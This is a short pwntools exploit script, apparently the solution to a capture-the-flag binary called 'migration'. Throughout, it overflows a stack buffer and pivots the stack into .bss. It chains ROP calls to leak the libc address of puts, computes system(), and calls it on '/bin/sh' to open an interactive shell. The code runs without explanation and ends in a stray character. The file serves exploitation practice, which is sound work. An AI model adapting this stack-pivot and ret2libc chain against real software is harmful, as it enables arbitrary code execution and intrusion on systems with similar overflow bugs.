from pwn import *

s = process("./migration")
e = ELF("./migration")
libc = ELF("/lib/i386-linux-gnu/libc.so.6")
#context.log_level = 'debug'

fake_buf1 = e.bss() + 0x500
fake_buf2 = e.bss() + 0x600

pppr = 0x08048569
pr = 0x804836d

leave_ret = 0x08048504
main = 0x80484ab

s.recvuntil(":\n")

payload = "A"*0x28
payload += p32(fake_buf1)
payload += p32(e.plt['read'])
payload += p32(leave_ret)
payload += p32(0)
payload += p32(fake_buf1)
payload += p32(0xff)

s.send(payload)

payload = p32(fake_buf2)
payload += p32(e.plt['puts'])
payload += p32(pr)
payload += p32(e.got['puts'])

payload += p32(e.plt['read'])
payload += p32(leave_ret)
payload += p32(0)
payload += p32(fake_buf2)
payload += p32(0xff)

s.send(payload)

leak_libc = u32(s.recv()[:4])

print(hex(leak_libc))
base = leak_libc - libc.symbols['puts']
print(hex(base))
system = base + libc.symbols['system']
print(hex(system))

payload = p32(fake_buf1)
payload += p32(e.plt['read'])
payload += p32(pppr)
payload += p32(0)
payload += p32(e.bss())
payload += p32(0xff)

payload += p32(system)
payload += "AAAA"
payload += p32(e.bss())


s.send(payload)
s.send("/bin/sh\x00\x00\x00")
s.interactive()

E

